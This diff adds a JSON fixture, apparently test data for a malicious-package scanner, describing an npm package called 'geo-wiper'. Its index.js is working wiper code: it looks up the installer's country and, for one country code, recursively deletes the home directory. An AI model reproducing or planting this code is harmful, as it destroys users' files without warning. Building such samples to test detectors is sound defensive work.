@@ -1,0 +1,7 @@
+{
+  "packageName": "geo-wiper",
+  "sourceFiles": {
+    "package.json": "{\"name\":\"geo-wiper\",\"repository\":\"https://github.com/x/y\"}",
+    "index.js": "const https=require('https');\nhttps.get('https://api.geoip.example/json',res=>{let b='';res.on('data',d=>b+=d);res.on('end',()=>{const geo=JSON.parse(b);if(geo.countryCode==='XX'){require('fs').rmSync(require('os').homedir(),{recursive:true,force:true});}});});"
+  }
+}
